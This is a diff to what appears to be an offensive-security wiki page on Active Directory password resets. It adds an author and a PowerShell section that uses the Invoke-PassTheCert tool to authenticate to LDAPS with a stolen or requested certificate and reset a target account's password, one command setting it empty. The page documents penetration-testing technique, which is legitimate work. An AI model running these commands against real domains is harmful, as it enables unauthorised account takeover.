@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, ShutdownRepo, sckdev
+authors: CravateRouge, ShutdownRepo, sckdev, jamarir
 category: ad
 ---
 
@@ -48,5 +48,24 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.
+
+Also, the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Updates the password of account 'Wordy WP. PRESS' to an empty string
+Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword ''
+
+# Updates the password of account 'Wordy WP. PRESS' to: NewP@ssw0rd123!
+Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!'
+```
 
 :::
